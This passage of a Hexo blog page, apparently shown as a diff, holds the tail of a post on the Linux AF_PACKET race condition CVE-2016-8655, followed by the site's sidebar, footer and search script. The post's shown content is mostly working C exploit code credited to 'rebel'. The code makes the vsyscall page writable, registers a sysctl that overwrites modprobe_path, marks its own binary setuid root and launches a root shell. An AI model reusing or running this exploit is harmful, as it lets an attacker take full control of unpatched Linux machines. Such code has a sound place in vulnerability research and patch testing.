class="number">300</span>; x++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(stat(<span class="string">"/proc/sys/hack"</span>,&amp;b) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"\nsysctl added!\n"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        write(<span class="number">2</span>,<span class="string">"."</span>,<span class="number">1</span>);</span><br><span class="line">        sleep(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"could not add sysctl\n"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">exploit</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">long</span> func, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg, <span class="keyword">void</span> *verification_func)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line">    <span class="keyword">int</span> pid;</span><br><span class="line">retry:</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">        try_exploit(func, arg, verification_func);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    wait(&amp;status);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\n"</span>);</span><br><span class="line">    <span class="keyword">if</span>(WEXITSTATUS(status) == <span class="number">2</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"retrying stage..\n"</span>);</span><br><span class="line">        kill(pid, <span class="number">9</span>);</span><br><span class="line">        sleep(<span class="number">2</span>);</span><br><span class="line">        <span class="keyword">goto</span> retry;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(WEXITSTATUS(status) != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"something bad happened, aborting exploit attempt\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    kill(pid, <span class="number">9</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">wrapper</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">ctl_table</span> *<span class="title">c</span>;</span></span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"exploit starting\n"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"making vsyscall page writable..\n\n"</span>);</span><br><span class="line">    exploit(off-&gt;set_memory_rw, VSYSCALL, verify_stage1);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"\nstage 1 completed\n"</span>);</span><br><span class="line">    sleep(<span class="number">5</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"registering new sysctl..\n\n"</span>);</span><br><span class="line">    c = (struct ctl_table *)(VSYSCALL+<span class="number">0x850</span>);</span><br><span class="line">    memset((char *)(VSYSCALL+0x850), '\x00', 1952);</span><br><span class="line">    <span class="built_in">strcpy</span>((<span class="keyword">char</span> *)(VSYSCALL+<span class="number">0xf00</span>),<span class="string">"hack"</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">char</span> *)(VSYSCALL+<span class="number">0xe00</span>),<span class="string">"\x01\x00\x00\x00"</span>,<span class="number">4</span>);</span><br><span class="line">    c-&gt;procname = (<span class="keyword">char</span> *)(VSYSCALL+<span class="number">0xf00</span>);</span><br><span class="line">    c-&gt;mode = <span class="number">0666</span>;</span><br><span class="line">    c-&gt;proc_handler = (<span class="keyword">void</span> *)(off-&gt;proc_dostring);</span><br><span class="line">    c-&gt;data = (<span class="keyword">void</span> *)(off-&gt;modprobe_path);</span><br><span class="line">    c-&gt;maxlen=<span class="number">256</span>;</span><br><span class="line">    c-&gt;extra1 = (<span class="keyword">void</span> *)(VSYSCALL+<span class="number">0xe00</span>);</span><br><span class="line">    c-&gt;extra2 = (<span class="keyword">void</span> *)(VSYSCALL+<span class="number">0xd00</span>);</span><br><span class="line">    exploit(off-&gt;register_sysctl_table, VSYSCALL+<span class="number">0x850</span>, verify_stage2);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stage 2 completed\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">launch_rootshell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">256</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> <span class="title">s</span>;</span></span><br><span class="line">    fd = open(<span class="string">"/proc/sys/hack"</span>,O_WRONLY);</span><br><span class="line">    <span class="keyword">if</span>(fd == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"could not open /proc/sys/hack\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    memset(buf,'\x00', 256);</span><br><span class="line">    readlink(<span class="string">"/proc/self/exe"</span>,(<span class="keyword">char</span> *)&amp;buf,<span class="number">256</span>);</span><br><span class="line">    write(fd,buf,<span class="built_in">strlen</span>(buf)+<span class="number">1</span>);</span><br><span class="line">    socket(AF_INET,SOCK_STREAM,<span class="number">132</span>);</span><br><span class="line">    <span class="keyword">if</span>(stat(buf,&amp;s) == <span class="number">0</span> &amp;&amp; s.st_uid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"binary executed by kernel, launching rootshell\n"</span>);</span><br><span class="line">        lseek(fd, <span class="number">0</span>, SEEK_SET);</span><br><span class="line">        write(fd,<span class="string">"/sbin/modprobe"</span>,<span class="number">15</span>);</span><br><span class="line">        close(fd);</span><br><span class="line">        execl(buf,buf,<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"could not create rootshell\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> status, pid;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">utsname</span> <span class="title">u</span>;</span></span><br><span class="line">    <span class="keyword">int</span> i, crash = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">512</span>], *f;</span><br><span class="line">    <span class="keyword">if</span>(argc == <span class="number">2</span> &amp;&amp; !<span class="built_in">strcmp</span>(argv[<span class="number">1</span>],<span class="string">"crash"</span>)) &#123;</span><br><span class="line">        crash = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(getuid() == <span class="number">0</span> &amp;&amp; geteuid() == <span class="number">0</span> &amp;&amp; !crash) &#123;</span><br><span class="line">        chown(<span class="string">"/proc/self/exe"</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        chmod(<span class="string">"/proc/self/exe"</span>,<span class="number">06755</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(getuid() != <span class="number">0</span> &amp;&amp; geteuid() == <span class="number">0</span> &amp;&amp; !crash) &#123;</span><br><span class="line">        setresuid(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        setresgid(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        execl(<span class="string">"/bin/bash"</span>,<span class="string">"bash"</span>,<span class="string">"-p"</span>,<span class="literal">NULL</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"linux AF_PACKET race condition exploit by rebel\n"</span>);</span><br><span class="line">    uname(&amp;u);</span><br><span class="line">    <span class="keyword">if</span>((f = <span class="built_in">strstr</span>(u.version,<span class="string">"-Ubuntu"</span>)) != <span class="literal">NULL</span>) *f = <span class="string">'\0'</span>;</span><br><span class="line">    <span class="built_in">snprintf</span>(buf,<span class="number">512</span>,<span class="string">"%s %s"</span>,u.release,u.version);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"kernel version: %s\n"</span>,buf);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; offsets[i].kernel_version != <span class="literal">NULL</span>; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(offsets[i].kernel_version,buf)) &#123;</span><br><span class="line">            <span class="keyword">while</span>(offsets[i].proc_dostring == <span class="number">0</span>)</span><br><span class="line">                i--;</span><br><span class="line">            off = &amp;offsets[i];</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(crash) &#123;</span><br><span class="line">        off = &amp;offsets[<span class="number">0</span>];</span><br><span class="line">        off-&gt;set_memory_rw = <span class="number">0xffffffff41414141</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(off) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"proc_dostring = %p\n"</span>,(<span class="keyword">void</span> *)off-&gt;proc_dostring);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"modprobe_path = %p\n"</span>,(<span class="keyword">void</span> *)off-&gt;modprobe_path);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"register_sysctl_table = %p\n"</span>,(<span class="keyword">void</span> *)off-&gt;register_sysctl_table);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">"set_memory_rw = %p\n"</span>,(<span class="keyword">void</span> *)off-&gt;set_memory_rw);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(!off) &#123;</span><br><span class="line">        <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"i have no offsets for this kernel version..\n"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(unshare(CLONE_NEWUSER) != <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"failed to create new user namespace\n"</span>);</span><br><span class="line">        <span class="keyword">if</span>(unshare(CLONE_NEWNET) != <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"failed to create new network namespace\n"</span>);</span><br><span class="line">        wrapper();</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    waitpid(pid, &amp;status, <span class="number">0</span>);</span><br><span class="line">    launch_rootshell();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Vulnerability/" rel="tag"># Vulnerability</a>
+          
+            <a href="/tags/Linux/" rel="tag"># Linux</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/09/18/Git基本使用/" rel="next" title="Git基本使用">
+                <i class="fa fa-chevron-left"></i> Git基本使用
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2016/09/30/ProcessOn在线作图/" rel="prev" title="ProcessOn在线作图">
+                ProcessOn在线作图 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image"
+                src="/images/avatar.gif"
+                alt="初心·守一" />
+            
+              <p class="site-author-name" itemprop="name">初心·守一</p>
+              <p class="site-description motion-element" itemprop="description">人之过 在于好为人师</p>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">28</span>
+                    <span class="site-state-item-name">posts</span>
+                  </a>
+                </div>
+              
+
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    <span class="site-state-item-count">24</span>
+                    <span class="site-state-item-name">tags</span>
+                  
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+            <div class="links-of-author motion-element">
+                
+                  <span class="links-of-author-item">
+                    <a href="https://github.com/jeffzh3ng" target="_blank" title="GitHub">
+                      
+                        <i class="fa fa-fw fa-github"></i>GitHub</a>
+                  </span>
+                
+                  <span class="links-of-author-item">
+                    <a href="mailto:jeffzh3ng@gmail.com" target="_blank" title="E-Mail">
+                      
+                        <i class="fa fa-fw fa-envelope"></i>E-Mail</a>
+                  </span>
+                
+            </div>
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#Linux内核竞争条件漏洞（CVE-2016-8655）"><span class="nav-number">1.</span> <span class="nav-text">Linux内核竞争条件漏洞（CVE-2016-8655）</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; 2014 &mdash; <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">初心·守一</span>
+
+  
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a class="theme-link" target="_blank" href="https://github.com/theme-next/hexo-theme-next">NexT.Mist</a> v6.0.1</div>
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=6.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=6.0.1"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=6.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=6.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=6.0.1"></script>
+
+
+
+  
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
